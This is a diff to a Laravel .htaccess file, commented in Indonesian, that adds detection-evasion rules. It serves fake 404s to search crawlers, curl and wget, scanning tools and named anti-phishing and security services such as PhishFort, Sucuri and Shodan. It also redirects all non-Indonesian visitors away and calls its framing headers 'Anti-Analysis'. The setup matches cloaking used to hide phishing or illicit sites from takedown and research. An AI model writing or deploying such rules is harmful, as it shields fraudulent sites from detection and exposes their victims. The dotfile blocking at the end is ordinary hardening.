@@ -5,6 +5,29 @@
 
     RewriteEngine On
 
+    # ------------------------------------------------------------------------------
+    # 1. ADVANCED BOT & SCANNER FILTERING (Suntikan Riset)
+    # ------------------------------------------------------------------------------
+    # Blokir User-Agent yang umum dipakai bot/scanner keamanan
+    RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|duckduckbot|baiduspider|yandex|crawler|spider|robot|curl|wget|python|nikto|dirbuster|sqlmap|nmap|scan|headless|puppeteer|selenium) [NC,OR]
+    RewriteCond %{HTTP_USER_AGENT} (phishfort|virusdie|sucuri|netsparker|censys|shodan|cybersance) [NC]
+    # Berikan respon 404 palsu agar bot mengira file tidak ada
+    RewriteRule .* - [R=404,L]
+
+    # ------------------------------------------------------------------------------
+    # 2. GEO-FENCING & DATA CENTER BLOCKING
+    # ------------------------------------------------------------------------------
+    # Jika server mendukung mod_geoip, hanya izinkan Indonesia
+    <IfModule mod_geoip.c>
+        GeoIPEnable On
+        RewriteCond %{ENV:GEOIP_COUNTRY_CODE} !^ID$
+        # Lempar pengunjung luar negeri ke Google
+        RewriteRule ^(.*)$ https://www.google.com/ [R=302,L]
+    </IfModule>
+
+    # ------------------------------------------------------------------------------
+    # 3. HEADER PROTECTION (Struktur Asli)
+    # ------------------------------------------------------------------------------
     # Handle Authorization Header
     RewriteCond %{HTTP:Authorization} .
     RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
@@ -13,6 +36,17 @@
     RewriteCond %{HTTP:x-xsrf-token} .
     RewriteRule .* - [E=HTTP_X_XSRF_TOKEN:%{HTTP:X-XSRF-Token}]
 
+    # ------------------------------------------------------------------------------
+    # 4. ANTI-CLICKJACKING & SECURITY HEADERS
+    # ------------------------------------------------------------------------------
+    # Mencegah website dibuka di dalam frame/iframe (Anti-Analysis)
+    Header set X-Frame-Options "DENY"
+    Header set X-XSS-Protection "1; mode=block"
+    Header set X-Content-Type-Options "nosniff"
+
+    # ------------------------------------------------------------------------------
+    # 5. LARAVEL DEFAULT RULES (Struktur Asli)
+    # ------------------------------------------------------------------------------
     # Redirect Trailing Slashes If Not A Folder...
     RewriteCond %{REQUEST_FILENAME} !-d
     RewriteCond %{REQUEST_URI} (.+)/$
@@ -23,3 +57,9 @@
     RewriteCond %{REQUEST_FILENAME} !-f
     RewriteRule ^ index.php [L]
 </IfModule>
+
+# Memblokir akses langsung ke file sensitif (.env, .git, dll)
+<FilesMatch "^\.">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
